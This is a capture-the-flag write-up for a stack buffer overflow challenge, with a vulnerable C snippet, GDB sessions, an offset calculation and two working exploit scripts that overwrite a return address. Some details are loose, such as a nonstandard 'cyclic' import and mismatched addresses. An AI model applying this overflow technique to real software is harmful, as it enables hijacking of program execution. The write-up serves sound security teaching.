# Stack Overflow 101 - Write-up

**Category:** Reverse Engineering / Binary Exploitation
**Difficulty:** Medium
**Flag:** `CTF{buff3r_0v3rfl0w_101_c0mpl3t3}`

## Challenge Description

A simple program has a hidden `secret_function()` that's never called. The challenge is to exploit a buffer overflow to redirect execution to this function.

```bash
$ ./stack_overflow $(python3 -c 'print("A"*100)')
```

## Initial Analysis

### Step 1: Understanding the Program

Running the program reveals useful information:

```bash
$ ./stack_overflow test
╔════════════════════════════════════════════════╗
║      Stack Overflow Challenge - Level 1        ║
║                                                ║
║  Can you redirect execution to secret_function?║
╚════════════════════════════════════════════════╝

[*] Address of secret_function: 0x401156
[*] Address of win: 0x401172
[*] Input length: 4 bytes

[*] Copying input to buffer...
[*] Buffer contents: test
[*] Return address will be at: 0x4011a5

[*] Function returned normally. Try again!
```

The program helpfully provides:
- Address of `secret_function`: `0x401156`
- Buffer size: 64 bytes (from source/hints)

### Step 2: Check Binary Protections

```bash
$ checksec --file=stack_overflow
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

- **No Stack Canary**: No protection against buffer overflows
- **No PIE**: Addresses are fixed (ASLR disabled for code)
- **NX Disabled**: Stack is executable (not needed for this challenge)

### Step 3: Static Analysis

#### Source Code Review

```c
void vulnerable_function(char *input) {
    char buffer[64];  // Fixed-size buffer
    strcpy(buffer, input);  // No bounds checking!
}

void secret_function() {
    printf("Flag: %s\n", FLAG);  // This is never called!
}
```

The vulnerability:
1. `buffer[64]` is a fixed-size local variable
2. `strcpy()` copies input without length check
3. Overflow can overwrite return address

#### Disassembly

```bash
$ objdump -d stack_overflow | grep -A5 "secret_function"
0000000000401156 <secret_function>:
  401156:   f3 0f 1e fa             endbr64
  40115a:   55                      push   rbp
  40115b:   48 89 e5                mov    rbp,rsp
```

Target address: `0x401156`

## Exploitation

### Understanding the Stack Layout

```
High Address
┌─────────────────────┐
│    Return Address   │ ← We want to overwrite this
├─────────────────────┤
│    Saved RBP        │ ← 8 bytes
├─────────────────────┤
│                     │
│    buffer[64]       │ ← 64 bytes
│                     │
├─────────────────────┤
│    Local vars       │
└─────────────────────┘
Low Address
```

To reach the return address, we need:
- 64 bytes (buffer)
- 8 bytes (saved RBP)
- = 72 bytes of padding

### Step 4: Finding the Exact Offset

Using a cyclic pattern to find exact offset:

```bash
$ gdb ./stack_overflow
(gdb) run $(python3 -c 'import cyclic; print(cyclic.gen(100))')

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011a5 in vulnerable_function ()
```

Checking RSP/RIP:
```gdb
(gdb) info registers rip
rip            0x4011a5            0x4011a5 <vulnerable_function+XX>
(gdb) x/gx $rsp
0x7fffffffde58: 0x6161616161616167  ← Part of our input!
```

The pattern `gaaaaaaa` (0x6161616161616167) tells us the offset.

### Step 5: Building the Exploit

```python
#!/usr/bin/env python3
"""
Stack Overflow 101 - Exploit
"""
import struct
import sys

# Target address (from binary analysis)
SECRET_ADDR = 0x401156

# Build payload
# 64 bytes buffer + 8 bytes saved RBP + return address
padding = b"A" * 72

# Little-endian address encoding
ret_addr = struct.pack("<Q", SECRET_ADDR)

payload = padding + ret_addr

# Output as argument
sys.stdout.buffer.write(payload)
```

### Step 6: Running the Exploit

```bash
# Generate payload
$ python3 exploit.py > payload.bin

# Run with payload
$ ./stack_overflow "$(cat payload.bin)"

╔════════════════════════════════════════════════╗
║      Stack Overflow Challenge - Level 1        ║
...
[*] Copying input to buffer...
[*] Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
[*] Return address will be at: 0x401156

╔════════════════════════════════════════════════╗
║         🎉 CONGRATULATIONS! 🎉                 ║
║    You've successfully exploited the buffer!   ║
╠════════════════════════════════════════════════╣
║  Flag: CTF{buff3r_0v3rfl0w_101_c0mpl3t3}       ║
╚════════════════════════════════════════════════╝
```

## Complete Exploit Script

```python
#!/usr/bin/env python3
"""
Stack Overflow 101 - Complete Exploit
Author: CTF Solver
"""

from pwn import *

# Configuration
BINARY = './stack_overflow'
SECRET_ADDR = 0x401156  # Address of secret_function

def exploit_local():
    """Run exploit locally"""
    # Build payload
    offset = 72  # 64 buffer + 8 saved rbp
    padding = b"A" * offset
    ret_addr = p64(SECRET_ADDR)

    payload = padding + ret_addr

    # Run binary with payload
    p = process([BINARY, payload])

    # Get output
    output = p.recvall(timeout=2).decode()
    print(output)

    # Check for flag
    if "CTF{" in output:
        print("\n[+] FLAG CAPTURED!")

def exploit_with_pwntools():
    """Using pwntools for cleaner exploit"""
    p = process(BINARY)

    # Wait for address info
    p.recvuntil(b'secret_function: ')
    addr_str = p.recvline().strip()
    secret_addr = int(addr_str, 16)
    log.info(f"secret_function @ {hex(secret_addr)}")

    # Build payload
    payload = b"A" * 72
    payload += p64(secret_addr)

    # Send payload
    p.sendline(payload)

    # Get flag
    output = p.recvall(timeout=2).decode()
    print(output)

def find_offset():
    """Use cyclic pattern to find exact offset"""
    from struct import pack, unpack

    # Generate cyclic pattern
    pattern = b""
    for i in range(0, 100, 4):
        for c3 in range(26):
            pattern += bytes([ord('a') + (i//4) % 26, ord('a'), ord('a'), ord('a')])
            if len(pattern) >= 100:
                break
        if len(pattern) >= 100:
            break

    # This is a simplified version - use pwntools cyclic() for real use
    print(f"[*] Pattern to test: {pattern[:80]}...")
    print(f"[*] Run: gdb ./stack_overflow")
    print(f"[*] Then: run $(python3 -c 'print(\"{pattern.decode()[:100]}\"')")

if __name__ == '__main__':
    import sys

    print("=" * 60)
    print("Stack Overflow 101 - Exploit")
    print("=" * 60)

    if len(sys.argv) > 1 and sys.argv[1] == "--find-offset":
        find_offset()
    else:
        exploit_local()
```

## Alternative: Using GDB

```gdb
# Start GDB
$ gdb ./stack_overflow

# Set breakpoint at vulnerable function
(gdb) break vulnerable_function
Breakpoint 1 at 0x4011a5

# Run with test input
(gdb) run $(python3 -c 'print("A"*80)')

# At breakpoint, examine stack
(gdb) x/20x $rsp
0x7fffffffde20: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fffffffde30: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fffffffde40: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fffffffde50: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fffffffde60: 0x41414141  0x41414141  0x00000000  0x00000000

# Continue to crash
(gdb) continue
Program received signal SIGSEGV

# Check where it tried to return
(gdb) x/i $rip
=> 0x4011a5 <vulnerable_function+XX>:  ret

# The return address has been overwritten!
(gdb) x/gx $rsp
0x7fffffffde68: 0x4141414141414141  ← "AAAAAAAA"
```

## Key Takeaways

### Why This Works

1. **Buffer Overflow**: `strcpy()` doesn't check bounds
2. **Stack Layout**: Return address is after local variables
3. **No Protections**: Binary compiled without stack canary
4. **Fixed Addresses**: No PIE means addresses are predictable

### Prevention Methods

1. **Use Safe Functions**: `strncpy()`, `snprintf()`, etc.
2. **Stack Canaries**: Compile with `-fstack-protector`
3. **ASLR**: Enable Address Space Layout Randomization
4. **DEP/NX**: Make stack non-executable

### Compile with Protections

```bash
# Secure compilation
gcc -fstack-protector-all -pie -fPIE -z noexecstack -o secure_binary source.c
```

## Tools Used

- **GDB/pwndbg** - Debugging and analysis
- **pwntools** - Exploit development
- **checksec** - Binary protection analysis
- **objdump** - Disassembly

## Attack Summary

| Step | Action | Purpose |
|------|--------|---------|
| 1 | Run program | Identify target address |
| 2 | Checksec | Confirm no protections |
| 3 | Find offset | Locate return address |
| 4 | Build payload | Padding + target address |
| 5 | Execute | Overflow buffer, redirect execution |

---

*This challenge demonstrates the fundamentals of stack-based buffer overflow exploitation, a classic vulnerability class that remains relevant today.*
